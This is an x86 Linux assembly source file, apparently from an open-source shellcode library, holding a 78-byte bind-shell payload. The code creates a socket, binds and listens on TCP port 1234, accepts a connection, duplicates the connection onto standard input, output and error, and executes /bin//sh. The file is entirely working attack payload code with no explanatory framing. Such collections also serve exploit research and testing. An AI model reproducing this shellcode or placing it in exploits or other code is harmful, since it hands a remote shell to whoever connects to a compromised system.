/*
 *  $Id: lin-x86-bndsockcode.s 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-x86-bndsockcode.s
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

# 78 bytes

bndsockcode:
    xorl    %ebx,%ebx
    mull    %ebx
    pushl   %ebx
    incl    %ebx
    pushl   %ebx
    pushl   $0x02
    movl    %esp,%ecx
    movb    $0x66,%al
    int     $0x80

    popl    %ebx
    popl    %esi
    pushl   %edx
    pushl   $0xd20402ff
    pushl   $0x10
    pushl   %ecx
    pushl   %eax
    movl    %esp,%ecx
    pushl   $0x66
    popl    %eax
    int     $0x80

    movl    %eax,0x04(%ecx)
    movb    $0x04,%bl
    movb    $0x66,%al
    int     $0x80

    incl    %ebx
    movb    $0x66,%al
    int     $0x80

    xchgl   %eax,%ebx
    popl    %ecx

0:
    pushl   $0x3f
    popl    %eax
    int     $0x80

    decl    %ecx
    jns     0b

shellcode:
#    xorl    %eax,%eax
#    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,%ecx
#    cltd
    movb    $0x0b,%al
    int     $0x80

